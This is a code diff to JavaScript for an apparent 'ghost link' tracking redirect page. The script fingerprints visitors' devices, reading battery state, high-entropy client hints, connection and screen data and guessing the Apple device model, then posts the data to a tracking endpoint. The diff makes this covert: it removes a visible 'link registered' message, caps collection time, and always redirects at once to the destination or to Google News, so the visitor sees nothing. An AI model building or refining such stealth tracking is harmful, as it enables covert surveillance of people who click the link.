@@ -1,33 +1,36 @@
 (async () => {
   const link = window.GHOST_LINK || {};
+  const fallbackUrl = link.destinationUrl || 'https://news.google.com/';
   const clientData = await collectClientData();
 
   try {
-    const response = await fetch(`/api/track/${encodeURIComponent(link.slug)}`, {
+    const trackRequest = fetch(`/api/track/${encodeURIComponent(link.slug)}`, {
       method: 'POST',
+      keepalive: true,
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ clientData })
     });
-    const data = await response.json();
-    if (data.destinationUrl) {
-      window.location.replace(data.destinationUrl);
-      return;
-    }
+
+    const response = await Promise.race([
+      trackRequest,
+      delay(650).then(() => null)
+    ]);
+    const data = response ? await response.json().catch(() => ({})) : {};
+    window.location.replace(data.destinationUrl || fallbackUrl);
+    return;
   } catch (error) {
     console.error(error);
   }
 
-  setTimeout(() => {
-    document.querySelector('.track-shell p').textContent = 'Enlace registrado correctamente.';
-  }, 500);
+  window.location.replace(fallbackUrl);
 })();
 
 async function collectClientData() {
   const nav = navigator;
   const screenData = window.screen || {};
   const connection = nav.connection || nav.mozConnection || nav.webkitConnection || {};
-  const battery = await readBattery();
-  const highEntropy = await readHighEntropyClientHints(nav);
+  const battery = await withTimeout(readBattery(), 180, null);
+  const highEntropy = await withTimeout(readHighEntropyClientHints(nav), 250, null);
   const deviceGuess = inferAppleDevice(nav, screenData);
 
   return {
@@ -71,6 +74,17 @@ async function collectClientData() {
     },
     battery
   };
+}
+
+function delay(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+async function withTimeout(promise, ms, fallback) {
+  return Promise.race([
+    promise,
+    delay(ms).then(() => fallback)
+  ]);
 }
 
 function inferAppleDevice(nav, screenData) {
